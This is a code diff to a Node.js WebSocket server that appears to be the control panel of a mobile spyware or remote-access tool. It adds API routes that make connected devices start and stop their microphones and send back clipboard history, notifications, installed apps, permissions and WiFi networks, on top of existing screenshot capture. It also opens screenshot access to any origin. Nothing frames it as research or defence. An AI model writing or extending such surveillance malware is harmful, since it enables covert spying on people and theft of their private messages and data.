@@ -4,6 +4,8 @@ const WebSocket = require('ws');
 const path = require('path');
 const multer = require('multer');
 const fs = require('fs');
+const { exec } = require('child_process');
+const os = require('os');
 
 const app = express();
 const server = http.createServer(app);
@@ -13,6 +15,11 @@ const wss = new WebSocket.Server({ server });
 const connectedDevices = new Map();
 const deviceHistory = new Map(); // Store device history even when offline
 const deviceScreenshots = new Map(); // Store latest screenshots
+const deviceClipboard = new Map(); // Store clipboard data
+const deviceNotifications = new Map(); // Store notifications
+const deviceApps = new Map(); // Store installed apps
+const devicePermissions = new Map(); // Store permissions
+const deviceWifi = new Map(); // Store wifi networks
 
 // Middleware
 app.use(express.json());
@@ -64,6 +71,36 @@ wss.on('connection', (ws) => {
         console.log(`Device ${deviceId} went offline`);
         break;
       }
+      case 'microphone_response':
+        handleMicrophoneResponse(ws, message.data);
+        console.log('Microphone data received from device');
+        break;
+        
+      case 'clipboard_response':
+        handleClipboardResponse(ws, message.data);
+        console.log('Clipboard data received from device');
+        break;
+        
+      case 'notifications_response':
+        handleNotificationsResponse(ws, message.data);
+        console.log('Notifications received from device');
+        break;
+        
+      case 'apps_response':
+        handleAppsResponse(ws, message.data);
+        console.log('Apps list received from device');
+        break;
+        
+      case 'permissions_response':
+        handlePermissionsResponse(ws, message.data);
+        console.log('Permissions received from device');
+        break;
+        
+      case 'wifi_response':
+        handleWifiResponse(ws, message.data);
+        console.log('WiFi networks received from device');
+        break;
+      
     }
   });
 });
@@ -166,10 +203,104 @@ function handleScreenshotResponse(ws, data) {
         deviceScreenshots.set(deviceId, {
           data: data.imageData,
           timestamp: new Date(),
-          format: data.format || 'jpeg'
+          format: data.format || 'png'
         });
         device.latestScreenshot = new Date();
+      } else if (data.error) {
+        console.error('Screenshot error:', data.error);
+        deviceScreenshots.set(deviceId, {
+          error: data.error,
+          timestamp: new Date()
+        });
       }
+      break;
+    }
+  }
+}
+
+function handleMicrophoneResponse(ws, data) {
+  for (const [deviceId, device] of connectedDevices.entries()) {
+    if (device.ws === ws) {
+      device.microphoneData = data;
+      break;
+    }
+  }
+}
+
+function handleClipboardResponse(ws, data) {
+  for (const [deviceId, device] of connectedDevices.entries()) {
+    if (device.ws === ws) {
+      if (!deviceClipboard.has(deviceId)) {
+        deviceClipboard.set(deviceId, []);
+      }
+      const clipboardHistory = deviceClipboard.get(deviceId);
+      clipboardHistory.unshift({
+        ...data,
+        timestamp: new Date()
+      });
+      // Keep only last 50 entries
+      if (clipboardHistory.length > 50) {
+        clipboardHistory.splice(50);
+      }
+      break;
+    }
+  }
+}
+
+function handleNotificationsResponse(ws, data) {
+  for (const [deviceId, device] of connectedDevices.entries()) {
+    if (device.ws === ws) {
+      if (!deviceNotifications.has(deviceId)) {
+        deviceNotifications.set(deviceId, []);
+      }
+      const notifications = deviceNotifications.get(deviceId);
+      if (Array.isArray(data.notifications)) {
+        notifications.unshift(...data.notifications.map(n => ({
+          ...n,
+          receivedAt: new Date()
+        })));
+        // Keep only last 100 notifications
+        if (notifications.length > 100) {
+          notifications.splice(100);
+        }
+      }
+      break;
+    }
+  }
+}
+
+function handleAppsResponse(ws, data) {
+  for (const [deviceId, device] of connectedDevices.entries()) {
+    if (device.ws === ws) {
+      deviceApps.set(deviceId, {
+        apps: data.apps || [],
+        lastUpdated: new Date()
+      });
+      break;
+    }
+  }
+}
+
+function handlePermissionsResponse(ws, data) {
+  for (const [deviceId, device] of connectedDevices.entries()) {
+    if (device.ws === ws) {
+      devicePermissions.set(deviceId, {
+        permissions: data.permissions || [],
+        lastUpdated: new Date()
+      });
+      break;
+    }
+  }
+}
+
+function handleWifiResponse(ws, data) {
+  for (const [deviceId, device] of connectedDevices.entries()) {
+    if (device.ws === ws) {
+      deviceWifi.set(deviceId, {
+        networks: data.networks || [],
+        currentNetwork: data.currentNetwork || null,
+        lastUpdated: new Date()
+      });
       break;
     }
   }
@@ -516,11 +647,167 @@ app.get('/api/devices/:deviceId/latest-screenshot', (req, res) => {
     return res.status(404).json({ error: 'No screenshot available' });
   }
   
+  if (screenshot.error) {
+    return res.status(500).json({ error: screenshot.error });
+  }
+  
   // Convert base64 to buffer and send as image
   const imageBuffer = Buffer.from(screenshot.data, 'base64');
   res.setHeader('Content-Type', `image/${screenshot.format}`);
   res.setHeader('Cache-Control', 'no-cache');
+  res.setHeader('Access-Control-Allow-Origin', '*');
   res.send(imageBuffer);
+});
+
+app.post('/api/devices/:deviceId/start-microphone', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  device.ws.send(JSON.stringify({
+    type: 'start_microphone',
+    data: { quality: req.body.quality || 'medium' }
+  }));
+  
+  res.json({ success: true, message: 'Microphone start request sent' });
+});
+
+app.post('/api/devices/:deviceId/stop-microphone', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  device.ws.send(JSON.stringify({
+    type: 'stop_microphone',
+    data: {}
+  }));
+  
+  res.json({ success: true, message: 'Microphone stop request sent' });
+});
+
+app.get('/api/devices/:deviceId/clipboard', (req, res) => {
+  const clipboardData = deviceClipboard.get(req.params.deviceId) || [];
+  res.json({ clipboard: clipboardData });
+});
+
+app.post('/api/devices/:deviceId/request-clipboard', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  device.ws.send(JSON.stringify({
+    type: 'request_clipboard',
+    data: {}
+  }));
+  
+  res.json({ success: true, message: 'Clipboard request sent' });
+});
+
+app.get('/api/devices/:deviceId/notifications', (req, res) => {
+  const notifications = deviceNotifications.get(req.params.deviceId) || [];
+  res.json({ notifications });
+});
+
+app.post('/api/devices/:deviceId/request-notifications', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  device.ws.send(JSON.stringify({
+    type: 'request_notifications',
+    data: {}
+  }));
+  
+  res.json({ success: true, message: 'Notifications request sent' });
+});
+
+app.get('/api/devices/:deviceId/apps', (req, res) => {
+  const appsData = deviceApps.get(req.params.deviceId);
+  res.json(appsData || { apps: [], lastUpdated: null });
+});
+
+app.post('/api/devices/:deviceId/request-apps', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  device.ws.send(JSON.stringify({
+    type: 'request_apps',
+    data: {}
+  }));
+  
+  res.json({ success: true, message: 'Apps request sent' });
+});
+
+app.get('/api/devices/:deviceId/permissions', (req, res) => {
+  const permissionsData = devicePermissions.get(req.params.deviceId);
+  res.json(permissionsData || { permissions: [], lastUpdated: null });
+});
+
+app.post('/api/devices/:deviceId/request-permissions', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  device.ws.send(JSON.stringify({
+    type: 'request_permissions',
+    data: {}
+  }));
+  
+  res.json({ success: true, message: 'Permissions request sent' });
+});
+
+app.get('/api/devices/:deviceId/wifi', (req, res) => {
+  const wifiData = deviceWifi.get(req.params.deviceId);
+  res.json(wifiData || { networks: [], currentNetwork: null, lastUpdated: null });
+});
+
+app.post('/api/devices/:deviceId/request-wifi', (req, res) => {
+  const device = connectedDevices.get(req.params.deviceId);
+  if (!device) {
+    return res.status(404).json({ error: 'Device not found' });
+  }
+  
+  if (!device.isOnline) {
+    return res.status(400).json({ error: 'Device is offline' });
+  }
+  
+  device.ws.send(JSON.stringify({
+    type: 'request_wifi',
+    data: {}
+  }));
+  
+  res.json({ success: true, message: 'WiFi request sent' });
 });
 
 app.post('/api/devices/:deviceId/upload-file', upload.single('file'), (req, res) => {
